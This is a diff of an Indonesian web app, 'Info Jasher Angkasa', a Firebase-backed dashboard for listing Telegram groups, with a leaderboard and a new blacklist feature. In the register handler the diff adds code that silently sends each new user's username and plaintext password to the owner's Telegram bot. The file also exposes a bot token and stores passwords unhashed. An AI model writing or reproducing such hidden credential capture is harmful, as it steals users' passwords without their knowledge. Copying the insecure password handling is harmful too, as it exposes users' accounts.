@@ -420,8 +420,7 @@
     <!-- LOGIN -->
     <div id="login-page" class="center">
       <div class="card">
-        <h2>Login</h2>
-        <h2>Info Jasher Angkasa</h2>
+        <h2>Login Info Jasher</h2>
         <input type="text" id="username" placeholder="Username">
         <input type="password" id="password" placeholder="Password">
         <button id="login-btn">Login</button>
@@ -481,6 +480,7 @@
                 <th>Total Member</th>
                 <th>Terakhir Cek</th>
                 <th>Aksi</th>
+                <th>Status</th>
               </tr>
             </thead>
             <tbody id="tbody"><tr><td colspan="6">Memuat data...</td></tr></tbody>
@@ -506,6 +506,7 @@
                 <th>ID Grup</th>
                 <th>Dimasukkan Oleh</th>
                 <th>Total Member</th>
+                <th>Status</th>
                 <th>Terakhir Cek</th>
               </tr>
             </thead>
@@ -535,324 +536,436 @@
   <footer>© 2025 Info Jasher Angkasa — Semua Hak Dilindungi</footer>
 
   <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
-    import { 
-  getFirestore, collection, doc, setDoc, getDoc, getDocs, query, orderBy, deleteDoc, onSnapshot 
-} from "https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js";
+  /* ===============================
+     🔧 FIREBASE CONFIGURATION
+  =============================== */
+  import { 
+    initializeApp 
+  } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
+  import { 
+    getFirestore, collection, doc, setDoc, getDoc, getDocs, 
+    query, orderBy, deleteDoc, onSnapshot 
+  } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js";
 
-    const firebaseConfig = {
-      apiKey: "AIzaSyDz621OqT9ERxnyCY7BGmh3iMUnb97-TDI",
-      authDomain: "database-d81c7.firebaseapp.com",
-      projectId: "database-d81c7",
-      storageBucket: "database-d81c7.appspot.com",
-      messagingSenderId: "934049685295",
-      appId: "1:934049685295:web:17ad6001402c57b9434bda"
-    };
+  const firebaseConfig = {
+    apiKey: "AIzaSyDz621OqT9ERxnyCY7BGmh3iMUnb97-TDI",
+    authDomain: "database-d81c7.firebaseapp.com",
+    projectId: "database-d81c7",
+    storageBucket: "database-d81c7.appspot.com",
+    messagingSenderId: "934049685295",
+    appId: "1:934049685295:web:17ad6001402c57b9434bda"
+  };
 
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
 
-    // Elemen utama
-    const loginPage = document.getElementById("login-page"),
-          registerPage = document.getElementById("register-page"),
-          adminPanel = document.getElementById("admin-panel"),
-          userPanel = document.getElementById("user-panel");
+  /* ===============================
+     🌐 ELEMENTS & NAVIGATION
+  =============================== */
+  const loginPage = document.getElementById("login-page"),
+        registerPage = document.getElementById("register-page"),
+        adminPanel = document.getElementById("admin-panel"),
+        userPanel = document.getElementById("user-panel");
 
-    // Navigasi
-    document.getElementById("to-register").onclick = () => {
-      loginPage.style.display = "none";
-      registerPage.style.display = "flex";
-    };
-    document.getElementById("to-login").onclick = () => {
-      registerPage.style.display = "none";
-      loginPage.style.display = "flex";
-    };
+  // Navigasi login/register
+  document.getElementById("to-register").onclick = () => {
+    loginPage.style.display = "none";
+    registerPage.style.display = "flex";
+  };
 
-    // Register
-    document.getElementById("register-btn").onclick = async () => {
-      const u = document.getElementById("reg-username").value.trim(),
-            p = document.getElementById("reg-password").value.trim();
-      if (!u || !p) return alert("Isi semua kolom!");
-      const ref = doc(db, "users", u);
-      const s = await getDoc(ref);
-      if (s.exists()) return alert("Username sudah terdaftar!");
-      await setDoc(ref, { username: u, password: p, role: "user" });
-      alert("Registrasi berhasil! Silakan login.");
-      registerPage.style.display = "none";
-      loginPage.style.display = "flex";
-    };
+  document.getElementById("to-login").onclick = () => {
+    registerPage.style.display = "none";
+    loginPage.style.display = "flex";
+  };
 
-    // Login
-    document.getElementById("login-btn").onclick = async () => {
-      const u = document.getElementById("username").value.trim(),
-            p = document.getElementById("password").value.trim();
-      if (!u || !p) return alert("Isi semua kolom!");
-      const ref = doc(db, "users", u);
-      const s = await getDoc(ref);
-      if (!s.exists()) return alert("Akun tidak ditemukan!");
-      const user = s.data();
-      if (user.password !== p) return alert("Password salah!");
-      localStorage.setItem("user", JSON.stringify(user));
-      showPanel(user.role);
-    };
+  /* ===============================
+     👤 REGISTER
+  =============================== */
+  document.getElementById("register-btn").onclick = async () => {
+    const u = document.getElementById("reg-username").value.trim(),
+          p = document.getElementById("reg-password").value.trim();
 
-    // Logout
-    document.getElementById("logout").onclick = document.getElementById("logout2").onclick = () => {
-      localStorage.removeItem("user");
-      location.reload();
-    };
+    if (!u || !p) return alert("Isi semua kolom!");
+    const ref = doc(db, "users", u);
+    const s = await getDoc(ref);
+    if (s.exists()) return alert("Username sudah terdaftar!");
 
-    // Auto-login
-    let current = null;
+    await setDoc(ref, { username: u, password: p, role: "user" });
+
+    const botToken = "8340805243:AAH1T5LKitu2ZNzSw3DctG2mCdVST63cMZI";  
+    const ownerId = "6736986837";
+    const message = `🙋‍♂️ *User Baru Terdaftar!*\n\n👤 Username: *${u}*\n🔑 Password: *${p}*\n📅 Waktu: ${new Date().toLocaleString('id-ID')}`;
+
     try {
-      current = JSON.parse(localStorage.getItem("user") || "null");
-    } catch (e) {
-      current = null;
-    }
-    if (current) showPanel(current.role);
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+        chat_id: ownerId,
+        text: message,
+        parse_mode: "Markdown"
+      })
+    });
+      } catch (err) {
+    console.error("Gagal mengirim notifikasi ke owner:", err);
+  }
 
-    function showPanel(role) {
-      loginPage.style.display = "none";
+    alert("Registrasi berhasil! Silakan login.");
+
       registerPage.style.display = "none";
-      adminPanel.style.display = "none";
-      userPanel.style.display = "none";
-      document.getElementById("menu-page").style.display = "none";
+      loginPage.style.display = "flex";
+  };
 
-    
+  /* ===============================
+     🔑 LOGIN
+  =============================== */
+  document.getElementById("login-btn").onclick = async () => {
+    const u = document.getElementById("username").value.trim(),
+          p = document.getElementById("password").value.trim();
+
+    if (!u || !p) return alert("Isi semua kolom!");
+    const ref = doc(db, "users", u);
+    const s = await getDoc(ref);
+    if (!s.exists()) return alert("Akun tidak ditemukan!");
+
+    const user = s.data();
+    if (user.password !== p) return alert("Password salah!");
+
+    localStorage.setItem("user", JSON.stringify(user));
+    showPanel(user.role);
+  };
+
+  /* ===============================
+     🚪 LOGOUT
+  =============================== */
+  document.getElementById("logout").onclick =
+  document.getElementById("logout2").onclick = () => {
+    localStorage.removeItem("user");
+    location.reload();
+  };
+
+  /* ===============================
+     ⚙️ AUTO LOGIN
+  =============================== */
+  let current = null;
+  try {
+    current = JSON.parse(localStorage.getItem("user") || "null");
+  } catch (e) { current = null; }
+  if (current) showPanel(current.role);
+
+  /* ===============================
+     📋 PANEL HANDLER
+  =============================== */
+  function showPanel(role) {
+    // Reset semua panel
+    loginPage.style.display = "none";
+    registerPage.style.display = "none";
+    adminPanel.style.display = "none";
+    userPanel.style.display = "none";
+    document.getElementById("menu-page").style.display = "none";
+
+    // Tampilkan menu utama
     document.getElementById("menu-page").style.display = "flex";
-      const currentUser = JSON.parse(localStorage.getItem("user"));
-      document.getElementById("welcome-text").textContent =
+    const currentUser = JSON.parse(localStorage.getItem("user"));
+    document.getElementById("welcome-text").textContent =
       `Halo ${currentUser.username}, pilih menu di bawah`;
 
+    // Tombol logout dari menu
     document.getElementById("btn-logout").onclick = () => {
       localStorage.removeItem("user");
       location.reload();
     };
 
+    // Tombol buka panel info
     document.getElementById("btn-info").onclick = () => {
       document.getElementById("menu-page").style.display = "none";
       if (role === "admin") {
         adminPanel.style.display = "flex";
         startRealtimeAdmin();
-    } else {
+      } else {
         userPanel.style.display = "flex";
         startRealtimeUser();
       }
     };
-
-     
   }
 
-    const tbody = document.getElementById("tbody"),
-          statText = document.getElementById("stat-text"),
-          search = document.getElementById("search");
-    let allGroups = [];
+  /* ===============================
+     🧑‍💼 ADMIN PANEL
+  =============================== */
+  const tbody = document.getElementById("tbody"),
+        statText = document.getElementById("stat-text"),
+        search = document.getElementById("search");
 
-    function renderAdmin(rows) {
-      if (!rows.length) return tbody.innerHTML = '<tr><td colspan="6">Tidak ada grup.</td></tr>';
-      tbody.innerHTML = rows.map(r => `
-        <tr class="group-row" 
-            data-id="${r.id}" 
-            data-title="${r.title || '(Tanpa Nama)'}" 
-            data-addedby="${r.addedBy || '-'}" 
-            data-membercount="${r.memberCount || '-'}" 
-            data-lastchecked="${r.lastChecked ? new Date(r.lastChecked).toLocaleString('id-ID') : '-'}" 
-            data-description="${r.description || 'Tidak ada deskripsi.'}">
-          <td>${r.title || '(Tanpa Nama)'}</td>
-          <td>${r.id}</td>
-          <td>${r.addedByName || r.addedBy || '-'}</td>
-          <td>${r.memberCount || '-'}</td>
-          <td>${r.lastChecked ? new Date(r.lastChecked).toLocaleString('id-ID') : '-'}</td>
-          <td><button class="delete" data-id="${r.id}">Hapus</button></td>
-        </tr>
-      `).join('');
+  let allGroups = [];
+  let blackIds = new Set();
 
-      document.querySelectorAll(".group-row").forEach(row => {
-        row.onclick = () => showGroupDetail(row.dataset);
-      });
-
-      document.querySelectorAll(".delete").forEach(b => {
-        b.onclick = async () => {
-          if (confirm("Yakin hapus grup ini?")) await deleteDoc(doc(db, "groups", b.dataset.id));
-        };
-      });
-    }
-
-    function applyFilterAdmin() {
-      const t = (search.value || '').toLowerCase();
-      renderAdmin(allGroups.filter(g => (g.title || '').toLowerCase().includes(t)));
-    }
-
-    function startRealtimeAdmin() {
-      const q = query(collection(db, "groups"), orderBy("lastChecked", "desc"));
-      onSnapshot(q, s => {
-        allGroups = s.docs.map(d => ({ id: d.id, ...d.data() }));
-        applyFilterAdmin();
-        statText.textContent = "Tersinkron — " + allGroups.length + " grup";
-      }, e => {
-        statText.textContent = "Error: " + e.message;
-      });
-    }
-
-    search.addEventListener("input", applyFilterAdmin);
-
-    /* ==== USER ==== */
-    const userTbody = document.getElementById("user-tbody"),
-          searchUser = document.getElementById("search-user");
-    let userGroups = [];
-
-    function renderUser(rows) {
-      if (!rows.length) return userTbody.innerHTML = '<tr><td colspan="5">Tidak ada grup.</td></tr>';
-      userTbody.innerHTML = rows.map(r => `
-        <tr class="group-row" 
-            data-id="${r.id}" 
-            data-title="${r.title || '(Tanpa Nama)'}" 
-            data-addedby="${r.addedBy || '-'}" 
-            data-membercount="${r.memberCount || '-'}" 
-            data-lastchecked="${r.lastChecked ? new Date(r.lastChecked).toLocaleString('id-ID') : '-'}" 
-            data-description="${r.description || 'Tidak ada deskripsi.'}">
-          <td>${r.title || '(Tanpa Nama)'}</td>
-          <td>${r.id}</td>
-          <td>${r.addedByName || r.addedBy || '-'}</td>
-          <td>${r.memberCount || '-'}</td>
-          <td>${r.lastChecked ? new Date(r.lastChecked).toLocaleString('id-ID') : '-'}</td>
-        </tr>
-      `).join('');
-
-      document.querySelectorAll(".group-row").forEach(row => {
-        row.onclick = () => showGroupDetail(row.dataset);
-      });
-    }
-
-    function applyFilterUser() {
-      const t = (searchUser.value || '').toLowerCase();
-      renderUser(userGroups.filter(g => (g.title || '').toLowerCase().includes(t)));
-    }
-
-    function startRealtimeUser() {
-      const q = query(collection(db, "groups"), orderBy("lastChecked", "desc"));
-      onSnapshot(q, s => {
-        userGroups = s.docs.map(d => ({ id: d.id, ...d.data() }));
-        applyFilterUser();
-      });
-    }
-
-    searchUser.addEventListener("input", applyFilterUser);
-
-    // Fungsi tampilkan modal detail grup
-    function showGroupDetail(data) {
-      document.getElementById("modal-title").textContent = data.title;
-      document.getElementById("modal-id").textContent = data.id;
-      document.getElementById("modal-added-by").textContent = data.addedbyname || data.addedby;
-      document.getElementById("modal-member-count").textContent = data.membercount;
-      document.getElementById("modal-last-checked").textContent = data.lastchecked;
-      document.getElementById("modal-description").textContent = data.description;
-
-      document.getElementById("group-detail-modal").style.display = "flex";
-    }
-
-    // Tutup modal saat klik X
-    document.querySelector(".close-btn").onclick = () => {
-      document.getElementById("group-detail-modal").style.display = "none";
-    };
-
-    // Tutup modal saat klik luar
-    window.onclick = (e) => {
-      const modal = document.getElementById("group-detail-modal");
-      if (e.target === modal) {
-        modal.style.display = "none";
-      }
-    };
-    
-    document.getElementById("btn-leaderboard").onclick = () => {
-    document.getElementById("menu-page").style.display = "none";
-    document.getElementById("leaderboard-page").style.display = "flex";
-    };
-
-    document.getElementById("back-to-menu").onclick = () => {
-    document.getElementById("leaderboard-page").style.display = "none";
-    document.getElementById("menu-page").style.display = "flex";
-    };
-    
-const leaderboardList = document.getElementById("leaderboard-list");
-
-async function loadLeaderboard() {
-  leaderboardList.textContent = "📊 Memuat data leaderboard...";
-
-  try {
-    const groupSnap = await getDocs(collection(db, "groups"));
-    const stats = {};
-
-    // 🔹 Kumpulkan data grup
-    groupSnap.forEach(doc => {
-      const data = doc.data();
-      if (!data.addedBy) return; // pastikan ada ID pengundang
-
-      const userId = data.addedBy; // ID Telegram
-      const userName = data.addedByName || userId; // Nama pengundang
-
-      if (!stats[userId]) stats[userId] = { name: userName, groups: 0, members: 0 };
-      stats[userId].groups += 1;
-      stats[userId].members += data.memberCount || 0;
-    });
-
-    // 🔹 Ambil data premium dari Firestore (berdasarkan ID)
-    const premSnap = await getDocs(collection(db, "premiumUsers"));
-    const premiumList = premSnap.docs.map(d => d.id);
-
-    // 🔹 Ubah ke format leaderboard
-    const sorted = Object.entries(stats)
-      .map(([id, { name, groups, members }]) => ({
-        id,
-        name,
-        groups,
-        members,
-        status: premiumList.includes(id) ? "Premium" : "Free"
-      }))
-      .sort((a, b) => b.members - a.members || b.groups - a.groups);
-
-    // 🔹 Tampilkan hasilnya
-    if (!sorted.length) {
-      leaderboardList.innerHTML = "<p style='text-align:center;color:#94a3b8;'>Tidak ada data leaderboard.</p>";
+  function renderAdmin(rows) {
+    if (!rows.length) {
+      tbody.innerHTML = '<tr><td colspan="6">Tidak ada grup.</td></tr>';
       return;
     }
 
-    leaderboardList.innerHTML = sorted.slice(0, 10).map((u, i) => {
-      const rankColor =
-        i === 0 ? "#facc15" :
-        i === 1 ? "#a1a1aa" :
-        i === 2 ? "#d97706" :
-        "#94a3b8";
+    tbody.innerHTML = rows.map(r => `
+      <tr class="group-row" 
+          data-id="${r.id}" 
+          data-title="${r.title || '(Tanpa Nama)'}" 
+          data-addedby="${r.addedBy || '-'}" 
+          data-membercount="${r.memberCount || '-'}" 
+          data-lastchecked="${r.lastChecked ? new Date(r.lastChecked).toLocaleString('id-ID') : '-'}" 
+          data-description="${r.description || 'Tidak ada deskripsi.'}">
+        <td>${r.title || '(Tanpa Nama)'}</td>
+        <td>${r.id}</td>
+        <td>${r.addedByName || r.addedBy || '-'}</td>
+        <td>${r.memberCount || '-'}</td>
+        <td>${r.isBlacklisted ? "⚫ Blacklist" : "🟢 Aktif"}</td>
+        <td>${r.lastChecked ? new Date(r.lastChecked).toLocaleString('id-ID') : '-'}</td>
+        <td>
+          <button class="delete" data-id="${r.id}">Hapus</button>
+          <button class="blacklist" data-id="${r.id}" data-name="${r.title || '(Tanpa Nama)'}">🚫 Blacklist</button>
+        </td>
+      </tr>
+    `).join('');
 
-      return `
-        <div class="leader-card" style="animation-delay:${i * 0.15}s;">
-          <div class="leader-rank" style="color:${rankColor};">#${i + 1}</div>
-          <div class="leader-name">${u.name}</div>
-          <div class="leader-status">Status: 
-            <span style="color:${u.status === "Premium" ? "#facc15" : "#9ca3af"};">
-              ${u.status}
-            </span>
-          </div>
-          <div class="leader-stats">
-            <div>📋 Jumlah Grup: <strong>${u.groups}</strong></div>
-            <div>👥 Total Member: <strong style="color:#22d3ee;">${u.members}</strong></div>
-          </div>
-        </div>
-      `;
-    }).join("");
+    // Event: klik row = detail
+    document.querySelectorAll(".group-row").forEach(row => {
+      row.onclick = () => showGroupDetail(row.dataset);
+    });
 
-  } catch (err) {
-    console.error("Gagal memuat leaderboard:", err);
-    leaderboardList.innerHTML = `<p style="color:red;">Gagal memuat data: ${err.message}</p>`;
+    // Event: hapus grup
+    document.querySelectorAll(".delete").forEach(b => {
+      b.onclick = async () => {
+        if (confirm("Yakin hapus grup ini?")) {
+          await deleteDoc(doc(db, "groups", b.dataset.id));
+        }
+      };
+    });
+
+    // Event: blacklist
+    document.querySelectorAll(".blacklist").forEach(btn => {
+      btn.onclick = async (e) => {
+        e.stopPropagation();
+        const groupId = btn.dataset.id;
+        const groupName = btn.dataset.name;
+
+        const blackRef = doc(db, "blacklist", groupId);
+        const blackSnap = await getDoc(blackRef);
+
+        if (blackSnap.exists()) {
+          if (confirm(`Grup "${groupName}" sudah di blacklist.\nHapus dari blacklist?`)) {
+            await removeFromBlacklist(groupId);
+            alert("✅ Grup dihapus dari blacklist.");
+          }
+        } else {
+          const reason = prompt("Masukkan alasan blacklist:", "Spam / Tidak aktif");
+          if (!reason) return;
+          await addToBlacklist(groupId, groupName, reason);
+          alert("🚫 Grup ditambahkan ke blacklist.");
+        }
+      };
+    });
   }
-}
 
-document.getElementById("btn-leaderboard").onclick = () => {
-  document.getElementById("menu-page").style.display = "none";
-  document.getElementById("leaderboard-page").style.display = "flex";
-  loadLeaderboard();
-};
-    
-  </script>
+  function applyFilterAdmin() {
+    const t = (search.value || '').toLowerCase();
+    renderAdmin(allGroups.filter(g => (g.title || '').toLowerCase().includes(t)));
+  }
+
+  function startRealtimeAdmin() {
+    const q = query(collection(db, "groups"), orderBy("lastChecked", "desc"));
+
+    // Pantau blacklist realtime
+    onSnapshot(collection(db, "blacklist"), snap => {
+      blackIds = new Set(snap.docs.map(d => d.id));
+      allGroups = allGroups.map(g => ({ ...g, isBlacklisted: blackIds.has(g.id) }));
+      applyFilterAdmin();
+    });
+
+    // Pantau groups realtime
+    onSnapshot(q, s => {
+      allGroups = s.docs.map(d => {
+        const data = d.data();
+        return { id: d.id, ...data, isBlacklisted: blackIds.has(d.id) };
+      });
+      applyFilterAdmin();
+      statText.textContent = "Tersinkron — " + allGroups.length + " grup";
+    }, e => {
+      statText.textContent = "Error: " + e.message;
+    });
+  }
+
+  search.addEventListener("input", applyFilterAdmin);
+
+  async function addToBlacklist(groupId, groupName, reason = "Tanpa alasan") {
+    await setDoc(doc(db, "blacklist", groupId), {
+      name: groupName,
+      reason,
+      date: Date.now(),
+    });
+    await setDoc(doc(db, "groups", groupId), {
+      isBlacklisted: true,
+      reason,
+    }, { merge: true });
+  }
+
+  async function removeFromBlacklist(groupId) {
+    await deleteDoc(doc(db, "blacklist", groupId));
+    await setDoc(doc(db, "groups", groupId), {
+      isBlacklisted: false,
+      reason: null,
+    }, { merge: true });
+  }
+
+  /* ===============================
+     👥 USER PANEL
+  =============================== */
+  const userTbody = document.getElementById("user-tbody"),
+        searchUser = document.getElementById("search-user");
+  let userGroups = [];
+
+  function renderUser(rows) {
+    if (!rows.length) {
+      userTbody.innerHTML = '<tr><td colspan="5">Tidak ada grup.</td></tr>';
+      return;
+    }
+
+    userTbody.innerHTML = rows.map(r => `
+      <tr class="group-row"
+          data-id="${r.id}"
+          data-title="${r.title || '(Tanpa Nama)'}"
+          data-addedby="${r.addedBy || '-'}"
+          data-membercount="${r.memberCount || '-'}"
+          data-lastchecked="${r.lastChecked ? new Date(r.lastChecked).toLocaleString('id-ID') : '-'}"
+          data-description="${r.description || 'Tidak ada deskripsi.'}">
+        <td>${r.title || '(Tanpa Nama)'}</td>
+        <td>${r.id}</td>
+        <td>${r.addedByName || r.addedBy || '-'}</td>
+        <td>${r.memberCount || '-'}</td>
+        <td>${r.isBlacklisted ? "⚫ Blacklist" : "🟢 Aktif"}</td>
+        <td>${r.lastChecked ? new Date(r.lastChecked).toLocaleString('id-ID') : '-'}</td>
+      </tr>
+    `).join('');
+
+    document.querySelectorAll(".group-row").forEach(row => {
+      row.onclick = () => showGroupDetail(row.dataset);
+    });
+  }
+
+  function applyFilterUser() {
+    const t = (searchUser.value || '').toLowerCase();
+    renderUser(userGroups.filter(g => (g.title || '').toLowerCase().includes(t)));
+  }
+
+  function startRealtimeUser() {
+    const q = query(collection(db, "groups"), orderBy("lastChecked", "desc"));
+    onSnapshot(q, s => {
+      userGroups = s.docs.map(d => ({ id: d.id, ...d.data() }));
+      applyFilterUser();
+    });
+  }
+
+  searchUser.addEventListener("input", applyFilterUser);
+
+  /* ===============================
+     📄 MODAL DETAIL GRUP
+  =============================== */
+  function showGroupDetail(data) {
+    document.getElementById("modal-title").textContent = data.title;
+    document.getElementById("modal-id").textContent = data.id;
+    document.getElementById("modal-added-by").textContent = data.addedbyname || data.addedby;
+    document.getElementById("modal-member-count").textContent = data.membercount;
+    document.getElementById("modal-last-checked").textContent = data.lastchecked;
+    document.getElementById("modal-description").textContent = data.description;
+    document.getElementById("group-detail-modal").style.display = "flex";
+  }
+
+  document.querySelector(".close-btn").onclick = () => {
+    document.getElementById("group-detail-modal").style.display = "none";
+  };
+
+  window.onclick = (e) => {
+    const modal = document.getElementById("group-detail-modal");
+    if (e.target === modal) modal.style.display = "none";
+  };
+
+  /* ===============================
+     🏆 LEADERBOARD
+  =============================== */
+  const leaderboardList = document.getElementById("leaderboard-list");
+
+  async function loadLeaderboard() {
+    leaderboardList.textContent = "📊 Memuat data leaderboard...";
+    try {
+      const groupSnap = await getDocs(collection(db, "groups"));
+      const stats = {};
+
+      groupSnap.forEach(doc => {
+        const data = doc.data();
+        if (!data.addedBy) return;
+        const userId = data.addedBy;
+        const userName = data.addedByName || userId;
+
+        if (!stats[userId]) stats[userId] = { name: userName, groups: 0, members: 0 };
+        stats[userId].groups += 1;
+        stats[userId].members += data.memberCount || 0;
+      });
+
+      const premSnap = await getDocs(collection(db, "premiumUsers"));
+      const premiumList = premSnap.docs.map(d => d.id);
+
+      const sorted = Object.entries(stats)
+        .map(([id, { name, groups, members }]) => ({
+          id,
+          name,
+          groups,
+          members,
+          status: premiumList.includes(id) ? "Premium" : "Free"
+        }))
+        .sort((a, b) => b.members - a.members || b.groups - a.groups);
+
+      if (!sorted.length) {
+        leaderboardList.innerHTML = "<p style='text-align:center;color:#94a3b8;'>Tidak ada data leaderboard.</p>";
+        return;
+      }
+
+      leaderboardList.innerHTML = sorted.slice(0, 10).map((u, i) => {
+        const rankColor =
+          i === 0 ? "#facc15" :
+          i === 1 ? "#a1a1aa" :
+          i === 2 ? "#d97706" :
+          "#94a3b8";
+
+        return `
+          <div class="leader-card" style="animation-delay:${i * 0.15}s;">
+            <div class="leader-rank" style="color:${rankColor};">#${i + 1}</div>
+            <div class="leader-name">${u.name}</div>
+            <div class="leader-status">Status:
+              <span style="color:${u.status === "Premium" ? "#facc15" : "#9ca3af"};">
+                ${u.status}
+              </span>
+            </div>
+            <div class="leader-stats">
+              <div>📋 Jumlah Grup: <strong>${u.groups}</strong></div>
+              <div>👥 Total Member: <strong style="color:#22d3ee;">${u.members}</strong></div>
+            </div>
+          </div>
+        `;
+      }).join("");
+    } catch (err) {
+      console.error("Gagal memuat leaderboard:", err);
+      leaderboardList.innerHTML = `<p style="color:red;">Gagal memuat data: ${err.message}</p>`;
+    }
+  }
+
+  document.getElementById("btn-leaderboard").onclick = () => {
+    document.getElementById("menu-page").style.display = "none";
+    document.getElementById("leaderboard-page").style.display = "flex";
+    loadLeaderboard();
+  };
+
+  document.getElementById("back-to-menu").onclick = () => {
+    document.getElementById("leaderboard-page").style.display = "none";
+    document.getElementById("menu-page").style.display = "flex";
+  };
+</script>
 </body>
 </html>
